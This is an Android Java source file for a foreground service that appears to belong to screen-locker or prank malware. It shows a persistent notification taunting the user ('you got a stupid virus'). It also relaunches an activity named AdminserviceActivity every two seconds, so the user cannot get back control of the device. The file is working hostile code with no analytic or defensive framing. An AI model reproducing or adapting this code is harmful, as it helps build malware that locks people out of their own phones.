package com.volt4g3s.vsd;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import java.util.Timer;
import java.util.TimerTask;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class foregroundService extends Service {
    
    public static Context context;
    private Timer _timer = new Timer();
    private TimerTask timer;
    public static final String CHANNEL_ID = "nubChannel";
    
    @Override
    public void onCreate() {
        context = this;
        super.onCreate();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String input = intent.getStringExtra("inputExtra");
        createNotificationChannel();
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,
                0, notificationIntent, 0);
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Idiot!!! you got a stupid virus")
                .setContentText(input)
                .setSmallIcon(R.drawable.ic_lock_white)
                .setContentIntent(pendingIntent)
                .build();
        startForeground(69693, notification);
        
        // your bg tasks here
        timer = new TimerTask() {
            @Override
            public void run() {
                new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        Intent startIntent = new Intent(context, AdminserviceActivity.class);
                        startIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(startIntent);
                    }
                });
            }
        };
        _timer.scheduleAtFixedRate(timer, (int)(2000), (int)(2000));
        
        return START_NOT_STICKY;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
	
	private void createNotificationChannel() {
        // Create the NotificationChannel, but only on API 26+ because
        // the NotificationChannel class is new and not in the support library
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = CHANNEL_ID;
            String description = "description";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            // Register the channel with the system; you can't change the importance
            // or other notification behaviors after this
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }
	
	
}